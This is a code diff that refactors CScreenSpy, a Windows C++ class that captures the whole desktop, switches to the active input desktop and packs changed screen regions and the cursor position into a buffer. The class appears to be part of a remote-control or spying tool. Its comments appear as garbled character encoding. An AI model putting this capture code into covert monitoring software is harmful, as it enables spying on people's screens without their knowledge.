@@ -1,5 +1,6 @@
 #include "ScreenSpy.h"
 #include "until.h"
+#include "iostream"
 
 #define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)
 
@@ -95,6 +96,11 @@ CScreenSpy::~CScreenSpy()
 	delete[] m_lpbmi_rect;
 }
 
+LPVOID CScreenSpy::getFirstScreen()
+{
+	::BitBlt(m_hFullMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
+	return m_lpvFullBits;
+}
 
 LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
 {
@@ -104,19 +110,15 @@ LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
 
 	SelectInputWinStation();
 
-	// ÷ÿ÷√rectª∫≥Â«¯÷∏’Î
 	m_rectBufferOffset = 0;
 
-	// –¥»Î π”√¡Àƒƒ÷÷À„∑®
 	WriteRectBuffer((LPBYTE)&m_byAlgorithm, sizeof(m_byAlgorithm));
 
-	// –¥»Îπ‚±ÍŒª÷√
-	POINT	CursorPos;
+	POINT CursorPos;
 	GetCursorPos(&CursorPos);
 	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));
 	
-	// –¥»Îµ±«∞π‚±Í¿‡–Õ
-	BYTE	bCursorIndex = m_CursorInfo.getCurrentCursorIndex();
+	BYTE bCursorIndex = m_CursorInfo.getCurrentCursorIndex();
 	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));
 
 	// ≤Ó“Ï±»ΩœÀ„∑®
@@ -130,45 +132,46 @@ LPVOID CScreenSpy::getNextScreen(LPDWORD lpdwBytes)
 	}
 
 	//  Û±ÍŒª÷√∑¢±‰ªØ≤¢«“»»µ„«¯”Ú»Áπ˚∑¢…˙±‰ªØ£¨“‘(∑¢…˙±‰ªØµƒ–– + DEF_STEP)œÚœ¬…®√Ë
-	// œÚ…œÃ·
 	int	nHotspot = max(0, CursorPos.y - DEF_STEP);
-	for (
-		int i = ((CursorPos.y != nOldCursorPosY) && ScanChangedRect(nHotspot)) ? (nHotspot + DEF_STEP) : m_nStartLine; 
+	for (int i = ((CursorPos.y != nOldCursorPosY) && ScanChangedRect(nHotspot)) ? (nHotspot + DEF_STEP) : m_nStartLine; 
 		i < m_nFullHeight; 
-		i += DEF_STEP
-		)
+		i += DEF_STEP)
 	{
 		if (ScanChangedRect(i))
 		{
 			i += DEF_STEP;
 		}
 	}
+
 	nOldCursorPosY = CursorPos.y;
 
 	m_nStartLine = (m_nStartLine + 3) % DEF_STEP;
 	*lpdwBytes = m_rectBufferOffset;
 
-	// œﬁ÷∆∑¢ÀÕ÷°µƒÀŸ∂»
 	while (GetTickCount() - m_dwLastCapture < m_dwSleep)
+	{
 		Sleep(1);
+	}
+
 	InterlockedExchange((LPLONG)&m_dwLastCapture, GetTickCount());
 
 	return m_rectBuffer;
 }
 
-
-
+//º∆À„≥ˆnStartLine’‚––µƒœÒÀÿ ˝æ›±‰ªØµƒrect«¯”Ú(ª·  µ±µƒ¿©¥Û∑∂ŒßDEF_STEP,OFF_SET),»ª∫Û∞—ƒ⁄»›∏¥÷∆µΩm_rectBuffer¿Ô
 bool CScreenSpy::ScanChangedRect(int nStartLine)
 {
-	bool	bRet = false;
-	LPDWORD p1, p2;
+	bool bRet = false;
+
 	::BitBlt(m_hLineMemDC, 0, 0, m_nFullWidth, 1, m_hFullDC, 0, nStartLine, m_dwBitBltRop);
-	// 0  «◊Ó∫Û“ª––
-	p1 = (PDWORD)((DWORD)m_lpvFullBits + ((m_nFullHeight - 1 - nStartLine) * m_nDataSizePerLine)); //*p1 ‘≠¿¥µƒ“ª–– ˝æ›
-	p2 = (PDWORD)m_lpvLineBits;
+
+	LPDWORD p1 = (PDWORD)((DWORD)m_lpvFullBits + ((m_nFullHeight - 1 - nStartLine) * m_nDataSizePerLine));
+	LPDWORD p2 = (PDWORD)m_lpvLineBits;
+
 	::SetRect(&m_changeRect, -1, nStartLine - DEF_STEP, -1, nStartLine + DEF_STEP * 2);
 
-	for (int j = 0; j < m_nFullWidth; j += m_nIncSize) // m_nIncSize “‚Àº « √ø¥ŒÕ˘∫Û“∆∂Øº∏∏ˆœÒÀÿ£¨±»»Á»Áπ˚ «8Œª…´£¨æÕ «1∏ˆœÒÀÿ1∏ˆ◊÷Ω⁄±Ì æ£¨√ø¥ŒŒ“√«±»Ωœ æÕœ‡µ±”⁄±»Ωœ¡À4∏ˆœÒÀÿµƒƒ⁄»›£¨»Áπ˚ «16Œª æÕœ‡µ±”⁄±»Ωœ2∏ˆœÒÀÿµƒ÷µ£¨À˘“‘ππ‘Ï∫Ø ˝ª·”√32≥˝Œª ˝
+	 // m_nIncSize “‚Àº « √ø¥Œ±»ΩœµƒÀƒ∏ˆ◊÷Ω⁄ƒ⁄»›(DWORD) µº  «º∏∏ˆœÒÀÿ£ø±»»Á»Áπ˚ «8Œª…´£¨æÕ «1∏ˆœÒÀÿ1∏ˆ◊÷Ω⁄±Ì æ£¨√ø¥ŒŒ“√«±»Ωœ æÕœ‡µ±”⁄±»Ωœ¡À4∏ˆœÒÀÿµƒƒ⁄»›£¨»Áπ˚ «16Œª æÕœ‡µ±”⁄±»Ωœ2∏ˆœÒÀÿµƒ÷µ£¨À˘“‘ππ‘Ï∫Ø ˝ª·”√32≥˝Œª ˝
+	for (int j = 0; j < m_nFullWidth; j += m_nIncSize)
 	{
 		if (*p1 != *p2)
 		{
@@ -186,7 +189,7 @@ bool CScreenSpy::ScanChangedRect(int nStartLine)
 		m_changeRect.top    = max(m_changeRect.top, 0);
 		m_changeRect.right  = min(m_changeRect.right, m_nFullWidth);
 		m_changeRect.bottom = min(m_changeRect.bottom, m_nFullHeight);
-		// ∏¥÷∆∏ƒ±‰µƒ«¯”Ú
+
 		CopyRect(&m_changeRect);
 		bRet = true;
 	}
@@ -228,12 +231,6 @@ biBitCount Œ™16 (16 Œª…´Õº) °¢24 (’Ê≤ …´Õº, ≤ª÷ß≥÷) °¢32 (32 Œª…´Õº)  ±√ª”–—’…´±
 		return lpbmi;
 	}
 
-	/*
-	Windows 95∫ÕWindows 98£∫»Áπ˚lpvBits≤Œ ˝Œ™NULL≤¢«“GetDIBits≥…π¶µÿÃÓ≥‰¡ÀBITMAPINFOΩ·ππ£¨ƒ«√¥∑µªÿ÷µŒ™ŒªÕº÷–◊‹π≤µƒ…®√Ëœﬂ ˝°£
-	
-    Windows NT£∫»Áπ˚lpvBits≤Œ ˝Œ™NULL≤¢«“GetDIBits≥…π¶µÿÃÓ≥‰¡ÀBITMAPINFOΩ·ππ£¨ƒ«√¥∑µªÿ÷µŒ™∑«0°£»Áπ˚∫Ø ˝÷¥–– ß∞‹£¨ƒ«√¥Ω´∑µªÿ0÷µ°£Windows NT£∫»ÙœÎªÒµ√∏¸∂‡¥ÌŒÛ–≈œ¢£¨«Îµ˜”√callGetLastError∫Ø ˝°£
-	*/
-
 	HDC	hDC = GetDC(NULL);
 	HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // ∏ﬂøÌ≤ªƒ‹Œ™0
 	GetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS);
@@ -259,33 +256,23 @@ void CScreenSpy::WriteRectBuffer(LPBYTE	lpData, int nCount)
 	m_rectBufferOffset += nCount;
 }
 
-LPVOID CScreenSpy::getFirstScreen()
+void CScreenSpy::CopyRect(LPRECT lpRect)
 {
-	::BitBlt(m_hFullMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);
-	return m_lpvFullBits;
-}
-
-//∞—lprect÷∏∂®µƒ«¯”Ú–¥µΩm_rectBuffer Õ¨ ±∏¸–¬m_lpbmi_full
-void CScreenSpy::CopyRect( LPRECT lpRect )
-{
-	OutputDebugStringA("CopyRect");
-	int	nRectWidth = lpRect->right - lpRect->left;
+	int	nRectWidth  = lpRect->right - lpRect->left;
 	int	nRectHeight = lpRect->bottom - lpRect->top;
 
-	LPVOID	lpvRectBits = NULL;
-	// µ˜’˚m_lpbmi_rect
 	m_lpbmi_rect->bmiHeader.biWidth = nRectWidth;
 	m_lpbmi_rect->bmiHeader.biHeight = nRectHeight;
-	m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3) 
-		* m_lpbmi_rect->bmiHeader.biHeight;
+	m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3) * m_lpbmi_rect->bmiHeader.biHeight;
 
-
+	LPVOID	lpvRectBits = NULL;
 	HBITMAP	hRectBitmap = ::CreateDIBSection(m_hFullDC, m_lpbmi_rect, DIB_RGB_COLORS, &lpvRectBits, NULL, NULL);
+	
 	::SelectObject(m_hRectMemDC, hRectBitmap);
-	::BitBlt(m_hFullMemDC, lpRect->left, lpRect->top, nRectWidth, nRectHeight, m_hFullDC, lpRect->left, lpRect->top, m_dwBitBltRop);//∏˙–¬m_lpbmi_full
+	::BitBlt(m_hFullMemDC, lpRect->left, lpRect->top, nRectWidth, nRectHeight, m_hFullDC, lpRect->left, lpRect->top, m_dwBitBltRop);
 	::BitBlt(m_hRectMemDC, 0, 0, nRectWidth, nRectHeight, m_hFullMemDC, lpRect->left, lpRect->top, SRCCOPY);
 
-	WriteRectBuffer((LPBYTE)lpRect, sizeof(RECT));//–¥Œª÷√
+	WriteRectBuffer((LPBYTE)lpRect, sizeof(RECT));
 	WriteRectBuffer((LPBYTE)lpvRectBits, m_lpbmi_rect->bmiHeader.biSizeImage);
 
 	DeleteObject(hRectBitmap);
@@ -301,7 +288,10 @@ void CScreenSpy::setCaptureLayer(bool bIsCaptureLayer)
 {
 	DWORD dwRop = SRCCOPY;
 	if (bIsCaptureLayer)
+	{
 		dwRop |= CAPTUREBLT;
+	}
+
 	InterlockedExchange((LPLONG)&m_dwBitBltRop, dwRop);
 }
 
@@ -312,22 +302,23 @@ LPBITMAPINFO CScreenSpy::getBI()
 
 UINT CScreenSpy::getBISize()
 {
-	int	color_num = m_nbiBitCount <= 8 ? 1 << m_nbiBitCount : 0;
+	int	colorNum = m_nbiBitCount <= 8 ? 1 << m_nbiBitCount : 0;
 	
-	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
+	return sizeof(BITMAPINFOHEADER) + (colorNum * sizeof(RGBQUAD));
 }
 
 bool CScreenSpy::SelectInputWinStation()
 {
-	bool bRet = ::SwitchInputDesktop();
+	bool bRet = SwitchInputDesktop();
 	if (bRet)
 	{
 		ReleaseDC(m_hDeskTopWnd, m_hFullDC);
 		m_hDeskTopWnd = GetDesktopWindow();
-		m_hFullDC = GetDC(m_hDeskTopWnd);
-	}	
+		m_hFullDC	  = GetDC(m_hDeskTopWnd);
+	}
 	return bRet;	
 }
+
 //// µ±«∞ ‰»Îµƒ»»µ„
 // LONG CScreenSpy::getKeyBoardHotspotY()
 // {
